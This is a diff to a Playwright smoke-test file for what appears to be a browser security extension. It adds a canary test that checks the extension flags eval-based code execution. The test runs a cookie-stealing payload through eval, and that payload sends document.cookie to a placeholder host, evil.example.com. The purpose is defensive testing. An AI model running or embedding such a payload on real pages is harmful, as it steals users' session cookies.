@@ -263,4 +263,65 @@ test.describe("False-Positive Smoke Test", () => {
         `See ${FP_SMOKE_REPORT_PATH} for details.`,
     ).toBe(0);
   });
+
+  test("canary: hooks are active (eval triggers alert)", async () => {
+    // Navigate fresh to reset dedup state
+    await ctx.page.goto(
+      `http://127.0.0.1:${ctx.serverPort}/fp-smoke.html`,
+      { waitUntil: "domcontentloaded" },
+    );
+    await ctx.page.waitForTimeout(2000); // Wait for hooks
+
+    // Execute a known attack pattern (eval with suspicious code)
+    await ctx.page.evaluate(() => {
+      // eslint-disable-next-line no-eval
+      eval("var stolen = document.cookie; fetch('https://evil.example.com/steal?d=' + stolen)");
+    });
+
+    // Wait for event pipeline to flush
+    await ctx.page.waitForTimeout(3000);
+
+    // Collect alerts
+    const sw = ctx.context
+      .serviceWorkers()
+      .find((w) => w.url().includes("background"));
+    expect(sw).toBeTruthy();
+
+    const extensionId = sw!.url().split("/")[2];
+    const dashPage = await ctx.context.newPage();
+    await dashPage.goto(`chrome-extension://${extensionId}/dashboard.html`, {
+      waitUntil: "domcontentloaded",
+    });
+    await dashPage.waitForTimeout(2000);
+
+    const result = await dashPage
+      .evaluate(async () => {
+        try {
+          return await chrome.runtime.sendMessage({ type: "GET_POPUP_EVENTS" });
+        } catch (e) {
+          return { error: (e as Error).message, events: [] };
+        }
+      })
+      .catch((e: Error) => ({ error: e.message, events: [] as AlertEntry[] }));
+
+    await dashPage.close();
+
+    const canaryAlerts: AlertEntry[] =
+      result && typeof result === "object" && "events" in result
+        ? (result as { events: AlertEntry[] }).events.filter(
+            (a) => a.category === "dynamic_code_execution",
+          )
+        : [];
+
+    console.log(
+      `\n  CANARY: ${canaryAlerts.length} dynamic_code_execution alert(s) detected`,
+    );
+
+    // ASSERTION: At least 1 eval alert proves hooks are active
+    expect(
+      canaryAlerts.length,
+      "Canary failed: eval() did not trigger dynamic_code_execution alert. " +
+        "Hooks may not be injecting properly.",
+    ).toBeGreaterThanOrEqual(1);
+  });
 });
